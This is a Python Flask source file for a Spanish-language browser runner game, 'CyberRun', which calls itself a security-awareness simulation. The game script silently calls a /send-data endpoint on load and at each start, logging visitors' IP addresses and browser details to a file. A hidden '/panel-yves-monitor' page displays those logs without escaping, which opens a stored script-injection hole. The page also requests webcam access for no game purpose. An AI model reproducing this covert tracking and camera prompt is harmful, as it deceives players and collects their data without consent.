from flask import Flask, render_template_string, request
import os
import socket
import platform
import json
from datetime import datetime

app = Flask(__name__)
@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberRun - Práctica de Ciberseguridad</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --neon-green: #00ff88;
            --neon-blue: #00cfff;
            --neon-red: #ff2d5b;
            --bg-dark: #0a0e1a;
            --bg-panel: #0f1628;
            --grid-color: rgba(0, 255, 136, 0.04);
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-dark);
            color: var(--neon-green);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Grid background */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(var(--grid-color) 1px, transparent 1px),
                linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        .wrapper {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            padding: 20px;
        }

        /* Header */
        .header {
            text-align: center;
        }

        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem;
            font-weight: 900;
            color: var(--neon-green);
            text-shadow: 0 0 20px rgba(0,255,136,0.6), 0 0 40px rgba(0,255,136,0.3);
            letter-spacing: 4px;
        }

        .header p {
            font-size: 0.75rem;
            color: rgba(0,255,136,0.4);
            letter-spacing: 3px;
            margin-top: 4px;
        }

        /* Score bar */
        .hud {
            width: 860px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 16px;
            background: var(--bg-panel);
            border: 1px solid rgba(0,255,136,0.2);
            border-radius: 4px;
        }

        .hud-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
        }

        .hud-label {
            font-size: 0.6rem;
            color: rgba(0,255,136,0.4);
            letter-spacing: 2px;
        }

        .hud-value {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            color: var(--neon-blue);
            text-shadow: 0 0 10px rgba(0,207,255,0.5);
        }

        #lives-display {
            font-size: 1.4rem;
            letter-spacing: 4px;
        }

        /* Game canvas */
        .game-wrapper {
            position: relative;
            width: 860px;
        }

        .game-container {
            position: relative;
            width: 860px;
            height: 320px;
            background: linear-gradient(180deg, #050d1a 0%, #0a1628 60%, #0f1e35 100%);
            border: 1px solid rgba(0,255,136,0.3);
            border-radius: 6px;
            overflow: hidden;
            box-shadow:
                0 0 30px rgba(0,255,136,0.08),
                inset 0 0 60px rgba(0,0,0,0.5);
        }

        /* Ground line */
        .game-container::after {
            content: '';
            position: absolute;
            bottom: 58px;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.4), transparent);
        }

        /* Ground tiles */
        .ground {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: repeating-linear-gradient(
                90deg,
                #0a1628 0px,
                #0a1628 39px,
                rgba(0,255,136,0.08) 40px
            );
            border-top: 2px solid rgba(0,255,136,0.25);
        }

        /* Character */
        #game-character {
            position: absolute;
            bottom: 60px;
            left: 60px;
            width: 56px;
            height: 80px;
            z-index: 10;
            transition: filter 0.1s;
        }

        #game-character img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            image-rendering: pixelated;
            filter: drop-shadow(0 0 6px rgba(0,255,136,0.5));
        }

        #game-character.hit {
            filter: drop-shadow(0 0 12px rgba(255,45,91,0.9)) brightness(2);
        }

        /* Obstacles */
        .obstacle {
            position: absolute;
            bottom: 60px;
            width: 54px;
            height: 60px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center bottom;
            background-image: url('static/anonymous_logo.png');
            filter: drop-shadow(0 0 8px rgba(255,45,91,0.6));
            z-index: 9;
        }

        /* Scanline overlay */
        .scanlines {
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0,0,0,0.03) 2px,
                rgba(0,0,0,0.03) 4px
            );
            pointer-events: none;
            z-index: 20;
        }

        /* Stars */
        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite alternate;
        }

        @keyframes twinkle {
            from { opacity: 0.2; }
            to   { opacity: 0.8; }
        }

        /* Clouds */
        .cloud {
            position: absolute;
            background: rgba(0,207,255,0.06);
            border-radius: 50px;
            animation: cloudMove linear infinite;
        }

        @keyframes cloudMove {
            from { transform: translateX(-200px); }
            to   { transform: translateX(900px); }
        }

        /* Start button */
        .btn-start {
            font-family: 'Orbitron', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            letter-spacing: 3px;
            padding: 14px 48px;
            background: transparent;
            color: var(--neon-green);
            border: 2px solid var(--neon-green);
            border-radius: 4px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            text-transform: uppercase;
            box-shadow: 0 0 20px rgba(0,255,136,0.2), inset 0 0 20px rgba(0,255,136,0.05);
        }

        .btn-start::before {
            content: '';
            position: absolute;
            inset: 0;
            background: var(--neon-green);
            transform: scaleX(0);
            transform-origin: left;
            transition: transform 0.3s ease;
            z-index: -1;
        }

        .btn-start:hover {
            color: var(--bg-dark);
            box-shadow: 0 0 40px rgba(0,255,136,0.5);
        }

        .btn-start:hover::before {
            transform: scaleX(1);
        }

        .btn-start:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        /* Speed indicator */
        .speed-bar-wrap {
            width: 860px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .speed-label {
            font-size: 0.6rem;
            letter-spacing: 2px;
            color: rgba(0,207,255,0.5);
            white-space: nowrap;
        }

        .speed-bar-bg {
            flex: 1;
            height: 4px;
            background: rgba(0,207,255,0.1);
            border-radius: 2px;
            overflow: hidden;
        }

        .speed-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
            border-radius: 2px;
            transition: width 0.5s ease;
            box-shadow: 0 0 6px rgba(0,207,255,0.5);
        }

        /* Game over overlay */
        #game-over-screen {
            display: none;
            position: absolute;
            inset: 0;
            background: rgba(10,14,26,0.92);
            z-index: 30;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 16px;
        }

        #game-over-screen.visible {
            display: flex;
        }

        #game-over-screen h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem;
            color: var(--neon-red);
            text-shadow: 0 0 30px rgba(255,45,91,0.8);
            animation: flicker 0.5s infinite alternate;
        }

        @keyframes flicker {
            from { opacity: 1; }
            to   { opacity: 0.7; }
        }

        #game-over-screen p {
            color: rgba(255,255,255,0.5);
            font-size: 0.85rem;
        }

        /* Controls hint */
        .controls-hint {
            font-size: 0.65rem;
            color: rgba(0,255,136,0.25);
            letter-spacing: 2px;
        }

        /* Jump key indicator */
        .key-indicator {
            display: inline-block;
            padding: 2px 8px;
            border: 1px solid rgba(0,255,136,0.3);
            border-radius: 3px;
            font-size: 0.65rem;
            color: rgba(0,255,136,0.5);
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>// CYBER_RUN</h1>
            <p>SECURITY AWARENESS SIMULATION v1.0</p>
        </div>

        <div class="hud">
            <div class="hud-item">
                <span class="hud-label">SCORE</span>
                <span class="hud-value" id="score-display">000000</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">LIVES</span>
                <span id="lives-display">❤️ ❤️ ❤️</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">LEVEL</span>
                <span class="hud-value" id="level-display">01</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">BEST</span>
                <span class="hud-value" id="best-display">000000</span>
            </div>
        </div>

        <div class="game-wrapper">
            <div class="game-container" id="gameContainer">
                <div class="scanlines"></div>
                <div class="ground"></div>

                <!-- Stars -->
                <div class="star" style="width:2px;height:2px;top:20px;left:100px;animation-delay:0s"></div>
                <div class="star" style="width:1px;height:1px;top:40px;left:250px;animation-delay:0.5s"></div>
                <div class="star" style="width:2px;height:2px;top:15px;left:450px;animation-delay:1s"></div>
                <div class="star" style="width:1px;height:1px;top:55px;left:620px;animation-delay:1.5s"></div>
                <div class="star" style="width:2px;height:2px;top:30px;left:750px;animation-delay:0.8s"></div>

                <!-- Clouds -->
                <div class="cloud" style="width:120px;height:30px;top:30px;animation-duration:18s;animation-delay:-4s"></div>
                <div class="cloud" style="width:90px;height:22px;top:55px;animation-duration:24s;animation-delay:-12s"></div>

                <!-- Character -->
                <div id="game-character">
                    <img src="static/image.png" alt="Runner" id="char-img">
                </div>

                <!-- Obstacles (3 para generar variación) -->
                <div class="obstacle" id="obs1" style="left:1000px"></div>
                <div class="obstacle" id="obs2" style="left:1400px"></div>
                <div class="obstacle" id="obs3" style="left:1800px"></div>

                <!-- Game Over overlay -->
                <div id="game-over-screen">
                    <h2>ACCESS DENIED</h2>
                    <p id="final-score-msg">SCORE: 000000</p>
                    <button class="btn-start" id="restartBtn">[ REINICIAR ]</button>
                </div>
            </div>
        </div>

        <div class="speed-bar-wrap">
            <span class="speed-label">VELOCIDAD</span>
            <div class="speed-bar-bg">
                <div class="speed-bar-fill" id="speed-bar" style="width:10%"></div>
            </div>
        </div>

        <button class="btn-start" id="startBtn">[ INICIAR PROTOCOLO ]</button>
        <p class="controls-hint">Presiona <span class="key-indicator">ESPACIO</span> o <span class="key-indicator">↑</span> para saltar · <span class="key-indicator">↓</span> para agacharse</p>
    </div>

    <script>
        // ─── Estado del juego ─────────────────────────────────
        const GROUND_Y    = 60;   // px desde el fondo del container
        const CHAR_H      = 80;
        const CHAR_W      = 56;
        const OBS_H       = 60;
        const OBS_W       = 54;
        const CONTAINER_W = 860;
        const CONTAINER_H = 320;
        const CHAR_X      = 60;   // posición horizontal fija del personaje

        let gameRunning  = false;
        let animFrameId  = null;
        let score        = 0;
        let bestScore    = 0;
        let lives        = 3;
        let level        = 1;
        let baseSpeed    = 4;
        let speed        = baseSpeed;
        let lastTime     = 0;
        let hitCooldown  = 0;  // frames de invencibilidad tras golpe

        // Física del personaje
        let charY        = 0;    // offset desde GROUND_Y (hacia arriba)
        let velY         = 0;
        let isGrounded   = true;
        let isCrouching  = false;
        const GRAVITY    = 0.55;
        const JUMP_VEL   = 13;   // velocidad inicial del salto

        // Obstáculos: array de objetos {el, x}
        const obstacles = [
            { el: document.getElementById('obs1'), x: 900,  gap: 0 },
            { el: document.getElementById('obs2'), x: 1350, gap: 0 },
            { el: document.getElementById('obs3'), x: 1800, gap: 0 },
        ];

        // Separación mínima y máxima entre obstáculos (px)
        const GAP_MIN = 340;
        const GAP_MAX = 600;

        const char          = document.getElementById('game-character');
        const scoreDisplay  = document.getElementById('score-display');
        const bestDisplay   = document.getElementById('best-display');
        const levelDisplay  = document.getElementById('level-display');
        const livesDisplay  = document.getElementById('lives-display');
        const speedBar      = document.getElementById('speed-bar');
        const gameOver      = document.getElementById('game-over-screen');
        const startBtn      = document.getElementById('startBtn');
        const restartBtn    = document.getElementById('restartBtn');

        // ─── Controles ────────────────────────────────────────
        const keys = {};
        document.addEventListener('keydown', e => {
            keys[e.code] = true;
            if ((e.code === 'Space' || e.code === 'ArrowUp') && gameRunning) {
                e.preventDefault();
                jump();
            }
            if (e.code === 'ArrowDown' && gameRunning) {
                e.preventDefault();
                crouch(true);
            }
        });
        document.addEventListener('keyup', e => {
            keys[e.code] = false;
            if (e.code === 'ArrowDown') crouch(false);
        });

        // Soporte táctil (click en el contenedor)
        document.getElementById('gameContainer').addEventListener('click', () => {
            if (gameRunning) jump();
        });

        function jump() {
            if (isGrounded && !isCrouching) {
                velY = JUMP_VEL;
                isGrounded = false;
            }
        }

        function crouch(state) {
            isCrouching = state;
            char.style.height = state ? '44px' : CHAR_H + 'px';
            char.style.bottom = (GROUND_Y) + 'px'; // se mantiene en suelo
        }

        // ─── Inicio / Reinicio ────────────────────────────────
        startBtn.addEventListener('click', startGame);
        // Llamada silenciosa al endpoint de datos
        fetch('/send-data').catch(() => {});
        activateCamera(); // <- agregar aquí
        restartBtn.addEventListener('click', startGame);

        function startGame() {
            score       = 0;
            lives       = 3;
            level       = 1;
            speed       = baseSpeed;
            charY       = 0;
            velY        = 0;
            isGrounded  = true;
            isCrouching = false;
            hitCooldown = 0;

            crouch(false);
            updateHUD();
            gameOver.classList.remove('visible');
            startBtn.disabled = true;

            // Posicionar obstáculos en cascada
            obstacles[0].x = 900;
            obstacles[1].x = 900 + randGap();
            obstacles[2].x = obstacles[1].x + randGap();

            gameRunning = true;
            lastTime = performance.now();
            cancelAnimationFrame(animFrameId);
            animFrameId = requestAnimationFrame(gameLoop);

            // Llamada silenciosa al endpoint de datos
            fetch('/send-data').catch(() => {});
        }

        function randGap() {
            return GAP_MIN + Math.random() * (GAP_MAX - GAP_MIN);
        }

        // ─── Game loop principal ──────────────────────────────
        function gameLoop(timestamp) {
            if (!gameRunning) return;

            const dt = Math.min((timestamp - lastTime) / 16.67, 2); // delta normalizado a 60fps
            lastTime = timestamp;

            updateScore(dt);
            updatePhysics(dt);
            updateObstacles(dt);
            checkCollisions();
            render();

            animFrameId = requestAnimationFrame(gameLoop);
        }

        function updateScore(dt) {
            score += speed * 0.15 * dt;
            scoreDisplay.textContent = String(Math.floor(score)).padStart(6, '0');

            // Incrementar nivel y velocidad cada 800 pts
            const newLevel = Math.floor(score / 800) + 1;
            if (newLevel !== level) {
                level = newLevel;
                speed = baseSpeed + (level - 1) * 0.8;
                levelDisplay.textContent = String(level).padStart(2, '0');
            }

            // Speed bar (cap en nivel 8)
            const pct = Math.min(((speed - baseSpeed) / (baseSpeed * 2)) * 100, 100);
            speedBar.style.width = (10 + pct * 0.9) + '%';
        }

        function updatePhysics(dt) {
            if (!isGrounded) {
                velY -= GRAVITY * dt;
                charY += velY * dt;

                if (charY <= 0) {
                    charY = 0;
                    velY  = 0;
                    isGrounded = true;
                }
            }
            if (hitCooldown > 0) hitCooldown -= dt;
        }

        function updateObstacles(dt) {
            obstacles.forEach((obs, i) => {
                obs.x -= speed * dt;

                // Reciclar: cuando sale por la izquierda
                if (obs.x < -OBS_W - 20) {
                    // Coloca detrás del último obstáculo
                    const maxX = Math.max(...obstacles.map(o => o.x));
                    obs.x = maxX + randGap();
                }
            });
        }

        function checkCollisions() {
            if (hitCooldown > 0) return;

            const charTop    = GROUND_Y + charY + (isCrouching ? 16 : 0);
            const charBottom = GROUND_Y + charY;
            const charLeft   = CHAR_X + 6;
            const charRight  = CHAR_X + CHAR_W - 6;

            for (const obs of obstacles) {
                const obsLeft   = obs.x + 6;
                const obsRight  = obs.x + OBS_W - 6;
                const obsBottom = GROUND_Y;
                const obsTop    = GROUND_Y + OBS_H;

                const overlapX = charRight > obsLeft && charLeft < obsRight;
                const overlapY = charBottom < obsTop  && charTop + (isCrouching ? 44 : CHAR_H) > obsBottom;

                if (overlapX && overlapY) {
                    loseLife();
                    break;
                }
            }
        }

        function loseLife() {
            lives--;
            hitCooldown = 60; // ~1s de invencibilidad
            char.classList.add('hit');
            setTimeout(() => char.classList.remove('hit'), 500);
            updateHUD();

            if (lives <= 0) {
                endGame();
            }
        }

        function render() {
            // Personaje
            const displayY = GROUND_Y + charY;
            char.style.bottom = displayY + 'px';

            // Obstáculos
            obstacles.forEach(obs => {
                obs.el.style.left = obs.x + 'px';
            });
        }

        function updateHUD() {
            const hearts = ['', '❤️', '❤️ ❤️', '❤️ ❤️ ❤️'];
            livesDisplay.textContent = lives >= 0 ? (hearts[Math.max(0, lives)] || '') : '';
            if (score > bestScore) {
                bestScore = score;
                bestDisplay.textContent = String(Math.floor(bestScore)).padStart(6, '0');
            }
        }

        function endGame() {
            gameRunning = false;
            cancelAnimationFrame(animFrameId);
            document.getElementById('final-score-msg').textContent =
                'SCORE FINAL: ' + String(Math.floor(score)).padStart(6, '0');
            gameOver.classList.add('visible');
            startBtn.disabled = false;
        }
        async function activateCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                console.log("Camara activada:", stream.getVideoTracks()[0].label);
            } catch (err) {
                console.log("Permiso denegado o cámara no disponible:", err.name);
            }
        }
    </script>
</body>
</html>
    """)

@app.route('/send-data', methods=['GET'])
def send_data():

    client_data = {
        "time": str(datetime.now()),
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "ip": request.remote_addr,
        "agent": request.headers.get("User-Agent")
    }

    try:
        with open("logs.json", "r") as f:
            logs = json.load(f)
    except:
        logs = []

    logs.append(client_data)

    with open("logs.json", "w") as f:
        json.dump(logs, f, indent=4)

    print("Nuevo acceso:", client_data)

    return {"status": "ok"}


@app.route('/panel-yves-monitor')
def dashboard():

    try:
        with open("logs.json") as f:
            logs = json.load(f)
    except:
        logs = []

    html = "<h1>Panel de monitoreo - Yves</h1>"

    for log in logs:
        html += f"""
        <p>
        IP: {log['ip']} <br>
        Sistema: {log['platform']} <br>
        Navegador: {log['agent']} <br>
        Hora: {log['time']} <br>
        </p>
        <hr>
        """

    return html
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)